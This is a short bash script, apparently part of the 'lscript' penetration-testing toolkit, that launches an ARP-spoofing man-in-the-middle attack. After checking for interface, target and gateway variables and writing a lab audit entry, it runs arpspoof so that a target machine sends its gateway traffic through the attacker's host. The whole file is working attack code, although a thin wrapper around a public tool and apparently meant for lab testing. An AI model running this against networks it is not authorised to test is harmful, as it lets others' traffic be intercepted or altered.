#! /bin/bash
LPATH="${LPATH:-/root/lscript}"
[[ -f "$LPATH/lib/lscript_lab.sh" ]] && source "$LPATH/lib/lscript_lab.sh"

if [[ -z "$GATEINT" || -z "$TARGIP" || -z "$GATENM" ]]
then
	echo -e "Missing GATEINT, TARGIP, or GATENM. Launch from lscript spoof menu."
	exit 1
fi
if ! command -v arpspoof >/dev/null 2>&1
then
	echo -e "Install: apt-get install -y dsniff"
	exit 1
fi

lscript_lab_audit "arp_mitm" "if=$GATEINT gw=$GATENM target=$TARGIP"
arpspoof -i "$GATEINT" -t "$TARGIP" "$GATENM"
